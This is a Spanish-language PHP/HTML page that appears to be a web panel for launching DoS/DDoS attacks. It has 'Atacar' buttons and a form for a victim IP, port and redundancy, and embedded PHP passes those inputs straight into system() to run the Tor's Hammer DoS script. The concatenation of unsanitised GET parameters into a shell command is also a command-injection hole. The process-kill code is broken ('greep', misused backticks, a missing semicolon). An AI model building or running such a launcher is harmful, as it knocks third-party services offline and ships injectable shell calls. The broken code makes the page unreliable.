<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title></title>
    <link rel="stylesheet" href="style.css">
    <link rel="alternate" href="Scripts.php">
  </head>
  <body>
    <menu></menu>
    <div id="ataques">
      <div class="ataques">
        <h2>DDOS</h2>
        <p>Un ataque DDoS, o ataque distribuido de denegación de servicio, es un tipo de ciberataque que intenta hacer que un sitio web o recurso de red no esté disponible colapsándolo con tráfico malintencionado para que no pueda funcionar correctamente.</p>
        <div class="boton">
          <button id="DDOS" type="button" name="button">Atacar</button>
        </div>
      </div>
      <div class="ataques">
        <h2>DOS</h2>
        <p>Un ataque DDoS, o ataque distribuido de denegación de servicio, es un tipo de ciberataque que intenta hacer que un sitio web o recurso de red no esté disponible colapsándolo con tráfico malintencionado para que no pueda funcionar correctamente.</p>
        <button type="button" name="button">Atacar</button>
      </div>
      <div class="ataques">

      </div>
      <div class="ataques">
      </div>
      <div class="ataques">

      </div>
      <div class="ataques">
      </div>
      <div class="ataques">

      </div>
      <div class="ataques">
      </div>
    </div>
    <div class="formularios hidden" id="F-DDOS">
      <form action="" method="get">
        <p>Escribe la IP de la victima.</p>
        <input type="text" name="IP" placeholder="192.168.214.100">
        <br>
        <p>Escribe el puerto que usa el servicio que quieres denegar.</p>
        <input type="text" name="PORT" placeholder="80">
        <br>
        <p>Escribe la redundancia que tendra el ataque.</p>
        <input type="text" name="RE" placeholder="512">
        <br>
        <button type="submit" name="button">Enviar</button>
      </form>
    </div>
    <footer></footer>
    <?php

    // Use ls command to shell_exec
    // function
    $output = system('python2 scripts/ThorHammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);

    $PID = shell_exec('ps -e | greep python2 | cut -b 1-8 -b');
    $matar = shell_exec(`kill $PID`)

    print_r('python2 scripts/Torshammer/torshammer.py -t'." ".$_GET['IP']." ".'-p'." ".$_GET['PORT']." ".'-r'." ".$_GET['RE']);

    ?>
  </body>
  <script type="text/javascript" src="main.js"></script>
</html>
